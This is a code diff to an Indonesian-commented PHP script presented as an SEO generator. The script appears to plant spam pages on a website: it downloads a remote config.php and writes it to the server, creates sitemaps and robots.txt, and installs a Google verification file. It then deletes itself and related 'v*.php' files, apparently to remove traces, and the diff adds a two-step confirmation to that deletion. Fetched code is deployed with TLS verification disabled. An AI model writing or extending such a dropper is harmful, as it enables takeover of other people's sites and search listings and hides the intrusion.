@@ -27,22 +27,63 @@ $local_sitemap_path = $server_path . '/sitemap.xml';
 
 // --- [FUNGSI HELPER] ---
 
+/**
+ * Fungsi fetchFromUrl (Versi Perbaikan)
+ * - Mendeteksi URL vs File Lokal
+ * - Menambahkan fallback fopen/fread untuk file lokal
+ */
 function fetchFromUrl($url, $default = []) { 
     $content = false;
-    if (ini_get('allow_url_fopen')) {
-        $content = @file_get_contents($url);
+    // Cek apakah ini URL eksternal atau file lokal
+    $is_url = (strpos($url, 'http') === 0 || strpos($url, 'https') === 0);
+
+    if ($is_url) {
+        // --- INI JIKA DIPANGGIL OLEH x.php (Mengambil URL Eksternal) ---
+        if (ini_get('allow_url_fopen')) {
+            $content = @file_get_contents($url);
+        }
+        if ($content === false && function_exists('curl_version')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            $content = curl_exec($ch);
+            curl_close($ch);
+        }
+    } else {
+        // --- INI JIKA DIPANGGIL OLEH config.php (Membaca File Lokal) ---
+        
+        // Coba metode #1: file_get_contents (paling cepat)
+        if (function_exists('file_get_contents')) {
+            $content = @file_get_contents($url);
+        }
+
+        // Fallback jika file_get_contents nonaktif
+        if ($content === false && function_exists('fopen') && function_exists('fread')) {
+            $content = '';
+            $handle = @fopen($url, 'r');
+            if ($handle) {
+                // Coba baca sekaligus jika file-nya ada
+                $filesize = @filesize($url);
+                if ($filesize > 0) {
+                    $content = fread($handle, $filesize);
+                } else {
+                    // Jika gagal, baca per bagian (chunk)
+                    while (!feof($handle)) {
+                        $content .= fread($handle, 8192); // Baca 8KB per 8KB
+                    }
+                }
+                fclose($handle);
+            } else {
+                $content = false; // Gagal membuka file
+            }
+        }
     }
-    if ($content === false && function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $content = curl_exec($ch);
-        curl_close($ch);
-    }
-    $data = json_decode($content, true);
+ 
+    $data = json_decode($content, true); 
+    
     if (is_array($data) && !empty($data)) {
         return $data;
     }
@@ -50,6 +91,7 @@ function fetchFromUrl($url, $default = []) {
 }
 
 function fetchRawUrl($url) {
+    // Fungsi ini hanya untuk URL eksternal (github), jadi tidak perlu fallback fopen
     $content = false;
     if (ini_get('allow_url_fopen')) {
         $content = @file_get_contents($url);
@@ -101,7 +143,7 @@ function buat_robots_txt($domain) {
 function jalankan_proses_seo_part1() {
     global $clean_host, $cache_dir, $local_json_path, $server_path, 
            $base_json_url_path, $local_sitemap_path, $self_script_name,
-           $config_url, $local_config_path; // [DITAMBAH]
+           $config_url, $local_config_path;
 
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
         header('Location: ' . $self_script_name);
@@ -182,7 +224,7 @@ function jalankan_proses_seo_part1() {
     @file_put_contents($local_sitemap_path, $xml_index);
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index dan $num_maps sub-sitemap dibuat."];
 
-    // --- TUGAS 4: UNDUH CONFIG.PHP [DIPINDAH KE SINI] ---
+    // --- TUGAS 4: UNDUH CONFIG.PHP ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php...'];
     $config_content = fetchRawUrl($config_url);
     if ($config_content !== false && !empty($config_content)) {
@@ -200,16 +242,14 @@ function jalankan_proses_seo_part1() {
  * BAGIAN 2: Menjalankan Tugas 5 (Google)
  */
 function jalankan_proses_seo_part2() {
-    global $clean_host, $google_url, $local_google_path, $self_script_name; // [DIHAPUS] config
+    global $clean_host, $google_url, $local_google_path, $self_script_name;
 
-    // Ambil json_filename dari URL
     $json_filename = $_GET['json_file'] ?? '';
-
     $logs = [
         ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses...']
     ];
 
-    // --- TUGAS 5: UNDUH GOOGLE HTML [HANYA INI YANG TERSISA] ---
+    // --- TUGAS 5: UNDUH GOOGLE HTML ---
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh google8f39414e57a5615a.html...'];
     $google_content = fetchRawUrl($google_url);
     if ($google_content !== false && !empty($google_content)) {
@@ -221,7 +261,6 @@ function jalankan_proses_seo_part2() {
     
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Semua tugas selesai. Mengalihkan ke status...'];
     
-    // Panggil terminal untuk ke Halaman Status
     tampilkan_log_terminal($logs, 'status', $json_filename, $clean_host);
 }
 
@@ -235,7 +274,9 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
     
     $step2_url = $self_script_name . '?action=generate_step2&json_file=' . urlencode($json_filename);
     $status_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
-    $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub';
+    $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub'; 
+    // CATATAN: Jika slug ini salah, Anda harus mengubahnya di sini.
+    // Berdasarkan file JSON Anda, slug ini BENAR.
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
     <style>
@@ -291,7 +332,7 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
                             window.open(check_slug_url, \'_blank\');
                             window.location.href = step2_url;
                         }
-                    }, { once: true }); // [PENTING] { once: true } mencegah listener ter-trigger berkali-kali
+                    }, { once: true }); 
 
                 } else if (next_action === "status") {
                     setTimeout(() => {
@@ -335,7 +376,8 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
 
 
 /**
- * Fungsi hapus_skrip_sendiri
+ * Fungsi hapus_skrip_sendiri (Halaman 1: Salin)
+ * [MODIFIKASI]
  */
 function hapus_skrip_sendiri() {
     global $self_script_name, $full_domain_url;
@@ -368,7 +410,7 @@ function hapus_skrip_sendiri() {
         <div class="terminal">
             <div class="terminal-header">
                 <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">delete.script</div>
+                <div style="color: #666; font-size: 10px;">delete.script (Step 1 of 2)</div>
             </div>
             <div class="terminal-content" id="terminalContent">
                 <div id="logsContainer"></div>
@@ -381,7 +423,7 @@ function hapus_skrip_sendiri() {
             {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai proses penghapusan skrip..."},
             {timestamp: "' . date('H:i:s') . '", type: "warning", message: "PERINGATAN: Pastikan domain telah di verifikasi di Google."},
             {timestamp: "' . date('H:i:s') . '", type: "warning", message: "File \'google...html\' dan \'v*.php\' akan dihapus permanen."},
-            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Tekan ENTER untuk menyalin domain dan MENGHAPUS SEMUA FILE."}
+            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Tekan ENTER untuk MENYALIN domain dan lanjut ke konfirmasi."}
         ];
         const container = document.getElementById("logsContainer");
         let currentLog = 0; let currentChar = 0; let currentLine = null;
@@ -391,9 +433,11 @@ function hapus_skrip_sendiri() {
                 document.addEventListener("keydown", function(e) {
                     if (e.key === "Enter") {
                         navigator.clipboard.writeText("' . $domain_to_show . '").then(() => {
-                            window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
+                            // [DIUBAH] Arahkan ke halaman konfirmasi baru
+                            window.location.href = \'' . $self_script_name . '?action=delete_confirm_prompt\';
                         }).catch(err => {
-                            window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
+                            // Jika clipboard gagal, tetap lanjut
+                            window.location.href = \'' . $self_script_name . '?action=delete_confirm_prompt\';
                         });
                     }
                 }, { once: true });
@@ -422,6 +466,91 @@ function hapus_skrip_sendiri() {
     </script>
     </body></html>';
 }
+
+/**
+ * [FUNGSI BARU] tampilkan_konfirmasi_hapus (Halaman 2: Konfirmasi)
+ */
+function tampilkan_konfirmasi_hapus() {
+    global $self_script_name, $full_domain_url;
+    $domain_to_show = htmlspecialchars($full_domain_url);
+
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
+        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
+        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
+        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
+        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
+        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
+        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
+        .log-info { color: #0095ff; }
+        .log-warning { color: #ffbd2e; } 
+        .log-success { color: #28ca42; }
+        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
+        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
+        .prompt { color: #28ca42; font-size: 11px; }
+        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
+        .domain-display { background: #1a1a1a; border: 1px solid #333; padding: 8px 12px; margin: 10px 0; font-size: 10px; color: #ffd60a; }
+    </style>
+    </head>
+    <body>
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
+                <div style="color: #666; font-size: 10px;">delete.script (Step 2 of 2)</div>
+            </div>
+            <div class="terminal-content" id="terminalContent">
+                <div id="logsContainer"></div>
+                <div class="domain-display">Domain (Disalin): ' . $domain_to_show . '</div>
+                <div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>
+            </div>
+        </div>
+    <script>
+        const logs = [
+            {timestamp: "' . date('H:i:s') . '", type: "success", message: "Domain berhasil disalin ke clipboard."},
+            {timestamp: "' . date('H:i:s') . '", type: "warning", message: "PERINGATAN: Langkah berikutnya akan MENGHAPUS SEMUA file."},
+            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Tekan ENTER untuk KONFIRMASI PENGHAPUSAN."}
+        ];
+        const container = document.getElementById("logsContainer");
+        let currentLog = 0; let currentChar = 0; let currentLine = null;
+        
+        function typeNextChar() {
+            if (currentLog >= logs.length) {
+                document.addEventListener("keydown", function(e) {
+                    if (e.key === "Enter") {
+                        // Arahkan ke URL penghapusan yang sebenarnya
+                        window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
+                    }
+                }, { once: true });
+                return;
+            }
+            const log = logs[currentLog];
+            if (currentChar === 0) {
+                currentLine = document.createElement("div");
+                currentLine.className = "log-entry";
+                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
+                container.appendChild(currentLine);
+            }
+            const messageElement = currentLine.querySelector(".typing");
+            if (currentChar < log.message.length) {
+                messageElement.textContent = log.message.substring(0, currentChar + 1);
+                currentChar++;
+                setTimeout(typeNextChar, 8);
+            } else {
+                messageElement.classList.remove("typing");
+                currentChar = 0;
+                currentLog++;
+                setTimeout(typeNextChar, 50);
+            }
+        }
+        setTimeout(typeNextChar, 200);
+    </script>
+    </body></html>';
+}
+
 
 /**
  * Fungsi tampilkan_status_selesai
@@ -550,21 +679,27 @@ function tampilkan_status_selesai() {
 // --- [ROUTER UTAMA (DIMODIFIKASI)] ---
 
 if (isset($_GET['action']) && $_GET['action'] === 'generate') {
-    // Memulai Bagian 1
     jalankan_proses_seo_part1();
     exit;
 }
 
 if (isset($_GET['action']) && $_GET['action'] === 'generate_step2') {
-    // Memulai Bagian 2 (setelah cek slug)
     jalankan_proses_seo_part2();
     exit;
 }
 
 if (isset($_GET['action']) && $_GET['action'] === 'delete' && !isset($_GET['confirm'])) {
-    hapus_skrip_sendiri();
+    hapus_skrip_sendiri(); // Memanggil Halaman 1 (Salin)
     exit;
 }
+
+// --- [BLOK BARU UNTUK HALAMAN 2 (KONFIRMASI)] ---
+if (isset($_GET['action']) && $_GET['action'] === 'delete_confirm_prompt') {
+    tampilkan_konfirmasi_hapus(); // Memanggil Halaman 2 (Konfirmasi Hapus)
+    exit;
+}
+// --- [AKHIR BLOK BARU] ---
+
 
 // --- [BLOK PENGHAPUSAN (TETAP SAMA)] ---
 if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
